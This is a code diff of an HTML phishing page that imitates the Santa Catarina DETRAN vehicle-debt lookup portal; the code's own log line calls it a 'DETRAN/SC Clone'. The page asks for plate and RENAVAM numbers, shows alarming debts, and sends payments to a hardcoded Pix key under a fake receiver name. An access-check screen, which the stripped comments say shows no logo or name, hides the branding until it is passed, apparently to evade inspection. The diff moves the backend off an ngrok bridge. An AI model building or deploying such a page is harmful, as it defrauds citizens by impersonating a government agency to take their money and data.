@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Acesso</title>
+    <title>Consultar Débitos do Veículo - DETRAN/SC</title>
     <link rel="icon" type="image/png" href="https://portaldetrandigital.com/assets/favicon-detran-sc.png">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -20,8 +20,6 @@
             display: flex;
             flex-direction: column;
         }
-
-        /* ===== HEADER (só aparece depois da verificação) ===== */
         .dsc-header {
             background: #fff;
             padding: 0 24px;
@@ -62,8 +60,6 @@
             height: 3px;
             background: linear-gradient(90deg, #C4000B 0%, #C4000B 33%, #4CAF50 33%, #4CAF50 66%, #8BC34A 66%, #8BC34A 100%);
         }
-
-        /* ===== MAIN ===== */
         .dsc-main {
             flex: 1;
             padding: 40px 24px 80px;
@@ -72,8 +68,6 @@
             max-width: 700px;
             margin: 0 auto;
         }
-
-        /* ===== TELA DE VERIFICAÇÃO (SEM LOGO, SEM NOME) ===== */
         #verificacao {
             display: flex;
             flex-direction: column;
@@ -202,19 +196,12 @@
             font-size: 11px;
             color: #999;
         }
-        .verificacao-box .recaptcha-badge a {
-            color: #136B9E;
-            text-decoration: none;
-        }
-
-        /* ===== FORMULÁRIO ===== */
         #paginaInicial {
             display: none;
         }
         #paginaInicial.active {
             display: block;
         }
-
         .dsc-back {
             display: flex;
             align-items: center;
@@ -358,8 +345,6 @@
             color: #888;
             margin-top: 4px;
         }
-
-        /* ===== RESULTADO ===== */
         .rsc-resultado {
             display: none;
         }
@@ -592,8 +577,6 @@
             color: #666;
             margin-bottom: 8px;
         }
-
-        /* ===== PIX MODAL ===== */
         .pix-overlay {
             display: none;
             position: fixed;
@@ -872,8 +855,6 @@
             margin-bottom: 8px;
             font-size: 13px;
         }
-
-        /* ===== FOOTER (só aparece depois da verificação) ===== */
         .dsc-footer {
             background: #f0f0f0;
             padding: 40px 24px 0;
@@ -921,8 +902,6 @@
             font-size: 13px;
             color: #555;
         }
-
-        /* ===== MODAL RENAVAM ===== */
         .dsc-modal-overlay {
             position: fixed;
             inset: 0;
@@ -982,8 +961,6 @@
             font-weight: 600;
             margin: 0;
         }
-
-        /* ===== LOADING ===== */
         .dsc-loading-overlay {
             position: fixed;
             inset: 0;
@@ -1019,126 +996,37 @@
             margin: 0 auto;
         }
         @keyframes dsc-spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
-
-        /* ===== RESPONSIVO ===== */
         @media (max-width: 768px) {
-            .dsc-main {
-                padding: 28px 10px 60px;
-            }
-            .dsc-title {
-                font-size: 22px;
-                line-height: 1.24;
-                margin: 0 0 22px;
-            }
-            .dsc-subtitle {
-                font-size: 14px;
-                line-height: 1.45;
-                max-width: 272px;
-                margin: 0 auto 22px;
-            }
-            .dsc-index-warning {
-                max-width: 312px;
-                margin: 0 auto 26px;
-                font-size: 13px;
-                line-height: 1.7;
-            }
-            .dsc-form {
-                max-width: 100%;
-            }
-            .rsc-grid {
-                grid-template-columns: 1fr;
-            }
-            .rsc-debts-header {
-                flex-direction: column;
-            }
-            .rsc-pagar-tudo {
-                width: 100%;
-                justify-content: center;
-            }
-            .rsc-table thead {
-                display: none;
-            }
-            .rsc-table tbody tr {
-                display: flex;
-                flex-direction: column;
-                flex-wrap: wrap;
-                border: 1px solid #ddd;
-                border-radius: 12px;
-                margin-bottom: 8px;
-                padding: 18px;
-                gap: 6px;
-                background: #fff;
-            }
-            .rsc-table tbody td {
-                display: flex;
-                flex-direction: column;
-                padding: 4px 0;
-                border: none;
-                text-align: left;
-                font-size: 14px;
-            }
-            .rsc-table tbody td::before {
-                content: attr(data-label);
-                font-weight: 600;
-                color: #888;
-                text-align: left;
-                font-size: 11px;
-                margin-bottom: 2px;
-                text-transform: uppercase;
-                letter-spacing: 0.3px;
-            }
-            .rsc-table tbody td.rsc-td-left {
-                width: 100%;
-                order: 1;
-            }
-            .rsc-table tbody td[data-label="Vencimento"] {
-                width: 50%;
-                order: 2;
-            }
-            .rsc-table tbody td[data-label="Valor total"] {
-                width: 50%;
-                order: 3;
-            }
-            .rsc-table tbody td.rsc-action-cell {
-                width: 100%;
-                order: 4;
-                justify-content: center;
-                margin-top: 8px;
-            }
-            .rsc-table tbody td.rsc-action-cell::before {
-                display: none;
-            }
-            .rsc-pagar-btn {
-                width: 100%;
-                justify-content: center;
-                padding: 12px;
-            }
-            .dsc-footer-logo {
-                height: 50px;
-            }
-            .pix-modal {
-                max-width: 100%;
-                margin: 16px;
-            }
-            #verificacao {
-                padding: 32px 16px;
-            }
-            .verificacao-box {
-                padding: 16px 20px;
-            }
-            #verificacao h2 {
-                font-size: 20px;
-            }
+            .dsc-main { padding: 28px 10px 60px; }
+            .dsc-title { font-size: 22px; line-height: 1.24; margin: 0 0 22px; }
+            .dsc-subtitle { font-size: 14px; line-height: 1.45; max-width: 272px; margin: 0 auto 22px; }
+            .dsc-index-warning { max-width: 312px; margin: 0 auto 26px; font-size: 13px; line-height: 1.7; }
+            .dsc-form { max-width: 100%; }
+            .rsc-grid { grid-template-columns: 1fr; }
+            .rsc-debts-header { flex-direction: column; }
+            .rsc-pagar-tudo { width: 100%; justify-content: center; }
+            .rsc-table thead { display: none; }
+            .rsc-table tbody tr { display: flex; flex-direction: column; flex-wrap: wrap; border: 1px solid #ddd; border-radius: 12px; margin-bottom: 8px; padding: 18px; gap: 6px; background: #fff; }
+            .rsc-table tbody td { display: flex; flex-direction: column; padding: 4px 0; border: none; text-align: left; font-size: 14px; }
+            .rsc-table tbody td::before { content: attr(data-label); font-weight: 600; color: #888; text-align: left; font-size: 11px; margin-bottom: 2px; text-transform: uppercase; letter-spacing: 0.3px; }
+            .rsc-table tbody td.rsc-td-left { width: 100%; order: 1; }
+            .rsc-table tbody td[data-label="Vencimento"] { width: 50%; order: 2; }
+            .rsc-table tbody td[data-label="Valor total"] { width: 50%; order: 3; }
+            .rsc-table tbody td.rsc-action-cell { width: 100%; order: 4; justify-content: center; margin-top: 8px; }
+            .rsc-table tbody td.rsc-action-cell::before { display: none; }
+            .rsc-pagar-btn { width: 100%; justify-content: center; padding: 12px; }
+            .dsc-footer-logo { height: 50px; }
+            .pix-modal { max-width: 100%; margin: 16px; }
+            #verificacao { padding: 32px 16px; }
+            .verificacao-box { padding: 16px 20px; }
+            #verificacao h2 { font-size: 20px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== HEADER (escondido até passar a verificação) ===== -->
     <header class="dsc-header" id="dscHeader">
         <div class="dsc-header-inner">
             <div class="dsc-header-left">
@@ -1149,7 +1037,6 @@
         <div class="dsc-header-line"></div>
     </header>
 
-    <!-- ===== LOADING ===== -->
     <div class="dsc-loading-overlay" id="dscLoading" style="display:none;">
         <div class="dsc-loading-modal">
             <p class="dsc-loading-text">Consultando débitos...</p>
@@ -1157,16 +1044,13 @@
         </div>
     </div>
 
-    <!-- ===== MAIN ===== -->
     <main class="dsc-main">
         <div class="dsc-container">
 
-            <!-- ===== TELA DE VERIFICAÇÃO (SEM LOGO, SEM NOME) ===== -->
             <div id="verificacao">
                 <div class="icone-cadeado">🔒</div>
                 <h2>Verificação de Acesso</h2>
                 <p class="subtitle">Confirme sua identidade para continuar</p>
-
                 <div class="verificacao-box" id="verificacaoBox">
                     <div class="checkbox-area">
                         <div class="custom-checkbox">
@@ -1187,26 +1071,21 @@
                         <span>Ambiente seguro e protegido</span>
                     </div>
                 </div>
-
                 <div class="verificacao-footer">
                     <span class="secure-text">✔ Ambiente seguro e protegido</span>
                     <p class="info-text">Após marcar a opção, a verificação será realizada automaticamente. Isso ajuda a proteger o sistema contra acessos indevidos.</p>
                 </div>
-
                 <button class="btn-verificar" id="btnContinuar">Continuar →</button>
             </div>
 
-            <!-- ===== PÁGINA INICIAL ===== -->
             <div id="paginaInicial">
                 <a class="dsc-back" onclick="voltarInicio()">
                     <span class="dsc-back-arrow">←</span>
                     <span class="dsc-back-text">Voltar ao início</span>
                 </a>
-
                 <h1 class="dsc-title">Consultar Débitos do Veículo</h1>
                 <h2 class="dsc-subtitle">CONSULTA DOSSIÊ VEÍCULO — DETRAN/SC</h2>
                 <p class="dsc-index-warning">Atenção: Esta consulta é restrita a veículos registrados ou com infrações em Santa Catarina.</p>
-
                 <form class="dsc-form" id="consultaForm" onsubmit="return handleConsultar(event)">
                     <div class="dsc-input-wrap">
                         <input type="text" class="dsc-input" placeholder="Placa do veículo" name="placa" id="placaInput" maxlength="7" autocomplete="off" oninput="this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '')">
@@ -1218,18 +1097,14 @@
                         <svg class="dsc-hint-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
                         <span class="dsc-hint-copy">Informe a placa (7 caracteres) do seu veículo.</span>
                     </p>
-
                     <div class="dsc-input-wrap">
                         <input type="text" class="dsc-input" placeholder="RENAVAM" name="renavam" id="renavamInput" maxlength="11" autocomplete="off" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')">
                         <div class="dsc-input-icon">
                             <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"></rect><line x1="7" y1="8" x2="7" y2="8"></line><line x1="11" y1="8" x2="11" y2="8"></line><line x1="15" y1="8" x2="15" y2="8"></line></svg>
                         </div>
                     </div>
-
                     <button type="button" class="dsc-renavam-link" id="btnRenavam">Onde encontrar o RENAVAM?</button>
-
                     <button type="submit" class="dsc-btn" id="btnConsultar">CONSULTAR DOSSIÊ VEÍCULO</button>
-
                     <p class="dsc-ssl">
                         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6b9a3a" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                         Seus dados são protegidos por criptografia SSL.
@@ -1237,7 +1112,6 @@
                 </form>
             </div>
 
-            <!-- ===== PÁGINA DE RESULTADO ===== -->
             <div id="paginaResultado" class="rsc-resultado">
                 <div class="rsc-back-row">
                     <a class="dsc-back" onclick="voltarInicio()">
@@ -1245,7 +1119,6 @@
                         <span class="dsc-back-text">Dossiê Completo</span>
                     </a>
                 </div>
-
                 <div class="rsc-plate-card">
                     <div class="rsc-plate-box">
                         <p class="rsc-plate-city" id="resultCidade">SC - CIDADE</p>
@@ -1253,7 +1126,6 @@
                     </div>
                     <p class="rsc-plate-date" id="resultData">Dossiê gerado em: --/--/----</p>
                 </div>
-
                 <div class="rsc-vehicle-card">
                     <h2 class="rsc-card-title">DADOS DO VEÍCULO</h2>
                     <div class="rsc-grid" id="vehicleGrid">
@@ -1267,7 +1139,6 @@
                         <div><div class="rsc-label">Chassi</div><div class="rsc-value" id="vChassi">-</div></div>
                     </div>
                 </div>
-
                 <div class="rsc-warning" id="warningDebitos">
                     <span class="rsc-warning-icon">⚠️</span>
                     <div>
@@ -1275,7 +1146,6 @@
                         <p>Regularize agora para evitar maiores acréscimos e o bloqueio do veículo.</p>
                     </div>
                 </div>
-
                 <div class="rsc-section rsc-debts-card">
                     <div class="rsc-debts-header">
                         <div>
@@ -1286,7 +1156,6 @@
                             ✥ Pagar tudo — <span id="btnPagarTudoValor">R$ 0,00</span>
                         </button>
                     </div>
-
                     <div class="rsc-table-shell">
                         <table class="rsc-table">
                             <thead>
@@ -1297,13 +1166,10 @@
                                     <th>Pagar</th>
                                 </tr>
                             </thead>
-                            <tbody id="debtBody">
-                                <!-- Gerado via JS -->
-                            </tbody>
+                            <tbody id="debtBody"></tbody>
                         </table>
                     </div>
                 </div>
-
                 <div class="rsc-error" id="resultError" style="display:none;">
                     <h2>⚠️ Veículo não encontrado</h2>
                     <p>Não foram encontrados dados para a placa informada. Verifique os dados e tente novamente.</p>
@@ -1313,7 +1179,6 @@
         </div>
     </main>
 
-    <!-- ===== FOOTER (escondido até passar a verificação) ===== -->
     <footer class="dsc-footer" id="dscFooter">
         <div class="dsc-footer-inner">
             <div class="dsc-footer-line"></div>
@@ -1326,7 +1191,6 @@
         <div class="dsc-footer-bottom"><span>Política de Privacidade</span></div>
     </footer>
 
-    <!-- ===== MODAL RENAVAM ===== -->
     <div class="dsc-modal-overlay" id="renavamModal">
         <div class="dsc-modal-content">
             <button type="button" class="dsc-modal-close" id="btnFecharRenavam">×</button>
@@ -1342,7 +1206,6 @@
         </div>
     </div>
 
-    <!-- ===== PIX MODAL ===== -->
     <div class="pix-overlay" id="pixOverlay">
         <div class="pix-modal">
             <div class="pix-modal-header">
@@ -1422,8 +1285,8 @@
         // ============================================================
         // CONFIGURAÇÕES
         // ============================================================
-        // 🔥 ROTA CORRIGIDA PARA USAR O NGROK (PONTE)
-        const API_URL = '/api/consultar-ngrok';
+        // 🔥 ROTA CORRIGIDA PARA USAR O SERVIDOR DIRETO
+        const API_URL = '/api/consultar';
         const CHAVE_PIX = 'e7b97758-34e9-4246-a361-43d4cec7f5b9';
         const NOME_RECEBEDOR = 'DETPR';
         const CIDADE_RECEBEDOR = 'DETPR';
@@ -1916,7 +1779,7 @@
             document.getElementById('verificacao').style.display = 'flex';
         });
 
-        console.log('✅ DETRAN/SC Clone - Com verificação humana e Ngrok!');
+        console.log('✅ DETRAN/SC Clone - Com verificação humana!');
         console.log('📌 API URL:', API_URL);
     </script>
 
